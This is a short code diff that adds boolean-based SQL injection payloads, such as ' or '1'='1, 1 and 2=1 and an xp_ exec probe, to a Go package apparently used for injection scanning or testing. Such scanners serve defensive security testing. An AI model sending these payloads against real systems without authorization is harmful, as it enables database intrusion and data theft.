@@ -2,6 +2,22 @@ package sqli
 
 var booleanPayloads = []string{
 	" OR 1=1",
+	" OR 1=2",
+	" AND 1=1",
+	" AND 2=1",
+	`1'1`,
+	`1 exec sp_ (or exec xp_)`,
+	`1 and 1=1`,
+	`1 and 2=1`,
+	`1' and 1=(select count(*) from tablenames); --`,
+	`1 or 1=1`,
+	`1 or 2=1`,
+	`1' or '1'='1`,
+	`1' or '2'='1`,
+	`1or1=1`,
+	`1or2=1`,
+	`1'or'1'='1`,
+	`1'or'2'='1`,
 }
 
 var errPayloads = []string{
